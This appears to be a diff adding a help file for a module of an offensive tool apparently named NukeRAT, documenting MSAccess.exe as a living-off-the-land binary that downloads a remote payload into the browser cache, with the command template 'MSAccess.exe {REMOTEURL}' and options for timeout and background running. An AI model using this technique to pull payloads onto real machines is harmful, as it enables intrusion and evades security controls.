@@ -1,0 +1,16 @@
+ABOUT
+    Microsoft Office component. LOLBAS documents remote payload download
+    into INetCache when the URL ends in .mdb.
+
+USAGE:
+    MSAccess.exe {REMOTEURL}
+
+EXAMPLES:
+    MSAccess.exe {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    MSAccess.exe {REMOTEURL}
